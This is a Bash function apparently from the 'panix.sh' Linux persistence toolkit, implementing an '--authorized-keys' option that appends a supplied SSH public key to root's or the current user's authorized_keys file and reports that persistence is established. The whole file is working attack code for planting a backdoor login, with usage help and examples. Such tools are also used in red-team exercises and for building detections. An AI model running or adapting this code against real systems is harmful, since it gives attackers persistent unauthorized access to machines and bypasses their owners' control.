setup_authorized_keys() {
	local key=""
	local path=""
	local default=0
	local custom=0

	usage_authorized_keys() {
		if check_root; then
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "--custom                     Use custom authorized keys settings"
			echo "  --key <key>                  Specify the public key"
			echo "  --path <path>                Specify custom authorized keys file path"
		else
			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default authorized keys settings"
			echo "  --key <key>                  Specify the public key"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--key )
				shift
				key=$1
				;;
			--path )
				shift
				path=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --authorized-keys --default --key <public_key>"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --authorized-keys --custom --key <public_key> --path /home/user/.ssh/authorized_keys"
				exit 0
				;;
			--help|-h)
				usage_authorized_keys
				exit 0
				;;
			* )
				echo "Invalid option for --authorized-keys: $1"
				echo "Try './panix.sh --authorized-keys --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	elif [[ -z $key ]]; then
		echo "Error: --key must be specified."
		echo "Try './panix.sh --authorized-keys --help' for more information."
		exit 1
	fi

	if check_root; then
		if [[ $default -eq 1 ]]; then
			path="/root/.ssh/authorized_keys"
		elif [[ $custom -eq 1 && -n $path ]]; then
			mkdir -p $(dirname $path)
		else
			echo "Error: --path must be specified with --custom for root."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	else
		if [[ $default -eq 1 ]]; then
			local current_user=$(whoami)
			path="/home/$current_user/.ssh/authorized_keys"
		else
			echo "Error: Only root can use --custom for --authorized-keys."
			echo "Try './panix.sh --authorized-keys --help' for more information."
			exit 1
		fi
	fi

	mkdir -p $(dirname $path)
	echo $key >> $path
	chmod 600 $path

	echo "[+] Authorized_keys persistence established!"
}
